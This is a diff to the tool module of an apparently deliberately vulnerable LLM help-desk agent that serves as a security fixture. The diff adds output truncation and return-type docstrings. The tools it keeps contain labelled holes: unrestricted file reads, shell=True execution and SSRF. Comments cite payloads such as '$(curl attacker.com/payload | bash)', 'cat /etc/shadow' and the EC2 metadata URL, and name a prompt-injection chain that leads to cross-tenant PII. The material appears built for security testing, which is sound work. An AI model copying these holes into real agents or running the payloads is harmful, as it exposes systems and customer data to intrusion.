@@ -15,15 +15,29 @@ what makes the agent able to reach tenant data, and what makes CHAIN-1 (chat
 prompt-injection -> un-tenant-scoped lookup -> cross-tenant PII) concrete.
 """
 
+import logging
 import math
 import re
 import subprocess
 import urllib.request
 from langchain_core.tools import tool
 
+from src.agent.tool_validation import MAX_TOOL_OUTPUT_LENGTH
 from src.data.rds_client import RDSClient
 from src.data.s3_client import S3Client
 from src.data.dynamodb_client import DynamoDBClient
+
+logger = logging.getLogger(__name__)
+
+
+def _truncate_output(tool_name: str, text: str) -> str:
+    if len(text) > MAX_TOOL_OUTPUT_LENGTH:
+        logger.warning(
+            "Tool output truncated: tool=%s original_length=%d limit=%d",
+            tool_name, len(text), MAX_TOOL_OUTPUT_LENGTH,
+        )
+        return text[:MAX_TOOL_OUTPUT_LENGTH]
+    return text
 
 
 # ── Input validation for HelpDeskAI domain tools ─────────────────────────────
@@ -95,12 +109,15 @@ def read_file(path: str) -> str:
 
     Args:
         path: Filesystem path to read. Relative or absolute.
+
+    Returns:
+        str, truncated to 50,000 characters.
     """
     # VULN-APP-003: No path validation. The caller can supply "../../../etc/passwd"
     # or any other path on the host filesystem. There is no chroot, no allow-list,
     # and no check that the path stays within the intended working directory.
     with open(path, "r") as f:
-        return f.read()
+        return _truncate_output("read_file", f.read())
 
 
 @tool
@@ -109,6 +126,9 @@ def run_shell(command: str) -> str:
 
     Args:
         command: The shell command to execute.
+
+    Returns:
+        str, truncated to 50,000 characters.
     """
     # VULN-APP-001: shell=True passes the command string to /bin/sh verbatim.
     # A caller supplying "ls; cat /etc/shadow" or "$(curl attacker.com/payload | bash)"
@@ -120,7 +140,7 @@ def run_shell(command: str) -> str:
         text=True,
         timeout=30,
     )
-    return result.stdout + result.stderr
+    return _truncate_output("run_shell", result.stdout + result.stderr)
 
 
 @tool
@@ -129,13 +149,18 @@ def fetch_url(url: str) -> str:
 
     Args:
         url: The URL to fetch. HTTP and HTTPS are supported.
+
+    Returns:
+        str, truncated to 50,000 characters.
     """
     # VULN-APP-002: No URL allowlist, no redirect cap, no IP range blocking.
     # An attacker can supply "http://169.254.169.254/latest/meta-data/" to reach
     # EC2 instance metadata, or "http://internal-service/" to reach services on
     # the agent's internal network (SSRF).
     with urllib.request.urlopen(url, timeout=10) as response:
-        return response.read().decode("utf-8", errors="replace")
+        return _truncate_output(
+            "fetch_url", response.read().decode("utf-8", errors="replace")
+        )
 
 
 # ── HelpDeskAI domain tools (operate on tenant data) ─────────────────────────
@@ -147,6 +172,10 @@ def lookup_order(order_id: str, tenant_id: str) -> dict:
     Args:
         order_id: The order identifier to look up.
         tenant_id: The current tenant context.
+
+    Returns:
+        dict(order_id=str, tenant_id=str, status=str, amount=float), plus any other
+        order columns; an empty dict if the order is not found.
     """
     # SECURITY FIXTURE: VULN-MT-001 + VULN-DATA-001 (transitive) — order_id flows
     # straight from the agent (and thus from end-customer chat input) into
@@ -166,6 +195,9 @@ def issue_refund(order_id: str, amount: float, tenant_id: str) -> bool:
         order_id: The order to refund.
         amount: Refund amount.
         tenant_id: The current tenant context.
+
+    Returns:
+        bool, True if a refund was applied.
     """
     # SECURITY FIXTURE: VULN-MT-001 + VULN-DATA-001 (transitive) — cross-tenant
     # write IDOR + SQLi reachable from the agent.
@@ -182,6 +214,9 @@ def search_kb(query_prefix: str, tenant_id: str) -> list:
     Args:
         query_prefix: Document key prefix to search.
         tenant_id: The current tenant context.
+
+    Returns:
+        list of dict(key=str, size=int, last_modified=str).
     """
     # SECURITY FIXTURE: VULN-MT-003 (transitive) — query_prefix flows into
     # S3Client.search_kb, which does not enforce a per-tenant prefix; "../other/"
@@ -200,6 +235,10 @@ def create_ticket(subject: str, body: str, customer_email: str, tenant_id: str) 
         body: Ticket body.
         customer_email: Customer's email.
         tenant_id: The current tenant context.
+
+    Returns:
+        dict(tenant_id=str, ticket_id=str, subject=str, body=str,
+        customer_email=str, status=str).
     """
     # Correctly tenant-scoped write (CTRL-DATA-001 lives in DynamoDBClient.create_ticket).
     _validate_id(tenant_id, "tenant_id")
@@ -219,6 +258,9 @@ def delegate_to_sub_agent(task: str) -> str:
 
     Args:
         task: A self-contained description of the sub-task to execute.
+
+    Returns:
+        str, a placeholder; the sub-agent node supplies the real result.
     """
     task = _validate_task_no_injection(task)
     # Routing signal: the orchestrator graph routes to the `sub_agent` node when it
